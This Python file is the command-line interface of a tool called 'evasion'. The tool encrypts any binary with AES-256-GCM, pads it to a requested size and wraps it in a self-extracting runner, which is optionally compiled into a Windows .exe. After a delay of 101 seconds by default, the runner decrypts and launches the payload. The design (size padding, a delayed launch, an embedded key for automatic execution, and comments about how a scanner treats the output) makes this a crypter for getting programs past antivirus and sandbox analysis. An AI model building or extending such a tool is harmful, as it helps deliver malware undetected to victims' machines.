"""Command-line interface for the evasion / HBX1 packaging tool."""

from __future__ import annotations

import argparse
import json
import sys
from pathlib import Path

from ..common import delay_number, positive_number
from .container import inspect_file
from .crypto import decrypt_file
from .runner import (
    build_executable_from_source,
    build_runner_file,
    is_runner,
    read_runner_container,
)


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="evasion",
        description=(
            "Encrypt a target binary with AES-256-GCM, pad it to a requested "
            "size, and package it into a self-extracting runner that waits for "
            "a delay before decrypting and launching the recovered program. "
            "A .exe output is built into a native Windows executable."
        ),
    )

    operation = parser.add_mutually_exclusive_group(required=True)
    operation.add_argument(
        "--encrypt",
        action="store_true",
        help="encrypt a file into a self-extracting runner",
    )
    operation.add_argument(
        "--decrypt",
        action="store_true",
        help="recover the original file from a runner without executing it",
    )
    operation.add_argument(
        "--inspect",
        action="store_true",
        help="inspect HBX1 metadata without decrypting",
    )

    parser.add_argument("source", type=Path, help="input file/container")
    parser.add_argument(
        "--output",
        type=Path,
        help="output file path. Required for --encrypt and --decrypt.",
    )
    parser.add_argument(
        "--add-size",
        type=positive_number,
        default=0.01,
        metavar="MB",
        help="additional size to add during encryption (default: 0.01 MB)",
    )
    parser.add_argument(
        "--delay",
        type=delay_number,
        default=101.0,
        metavar="SECONDS",
        help="execution delay enforced by the runner (default: 101 seconds)",
    )
    parser.add_argument(
        "--no-delay",
        action="store_true",
        help="skip the stored delay during --decrypt (useful for controlled testing)",
    )

    return parser


def _run_encrypt(parser: argparse.ArgumentParser, args: argparse.Namespace) -> int:
    if args.output is None:
        parser.error("--output is required with --encrypt")

    original_size = args.source.stat().st_size

    if args.output.suffix.lower() == ".exe":
        # A .exe output is packaged into a real native executable with
        # PyInstaller, because a script renamed to .exe does not run on
        # Windows and is not analysed as a program by a scanner.
        build_executable_from_source(
            source=args.source,
            output=args.output,
            add_size_mb=args.add_size,
            delay=args.delay,
        )
    else:
        # A self-extracting runner that recovers and launches the payload
        # using the embedded random key (no passphrase or key file needed).
        build_runner_file(
            source=args.source,
            output=args.output,
            add_size_mb=args.add_size,
            delay=args.delay,
        )

    final_size = args.output.stat().st_size

    print("[OK] Encryption completed.")
    print(f"[INFO] Input:       {args.source}")
    print(f"[INFO] Runner:      {args.output}")
    print(f"[INFO] Original:    {original_size} bytes")
    print(f"[INFO] Runner:      {final_size} bytes")
    print(f"[INFO] Added:       {final_size - original_size} bytes")
    print(f"[INFO] Delay:       {args.delay:g} second(s)")
    print("[INFO] Run the produced file to wait for the delay, decrypt and launch the payload.")

    return 0


def _run_decrypt(parser: argparse.ArgumentParser, args: argparse.Namespace) -> int:
    if args.output is None:
        parser.error("--output is required with --decrypt")

    decrypt_file(
        source=args.source,
        output=args.output,
        no_delay=args.no_delay,
    )

    print("[OK] Recovery completed.")
    print(f"[INFO] Recovered file: {args.output}")
    print("[INFO] The recovered file was written to disk but was NOT executed.")
    return 0


def _run_inspect(args: argparse.Namespace) -> int:
    if is_runner(args.source):
        header, ciphertext = read_runner_container(args.source)
        result = dict(header)
        result["artifact_type"] = "runner"
        result["container_ciphertext_bytes"] = len(ciphertext)
        result["artifact_size_bytes"] = args.source.stat().st_size
    else:
        result = inspect_file(args.source)
        result["artifact_type"] = "container"

    print(json.dumps(result, indent=2, sort_keys=True))
    return 0


def main(argv: list[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)

    try:
        if args.encrypt:
            return _run_encrypt(parser, args)
        if args.decrypt:
            return _run_decrypt(parser, args)
        if args.inspect:
            return _run_inspect(args)
        parser.error("no operation selected")
    except KeyboardInterrupt:
        print("\n[ERROR] Operation cancelled.", file=sys.stderr)
        return 130
    except (OSError, ValueError, EOFError) as exc:
        print(f"[ERROR] {exc}", file=sys.stderr)
        return 1
    except Exception as exc:  # noqa: BLE001 - top-level CLI guard
        print(f"[ERROR] Unexpected failure: {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
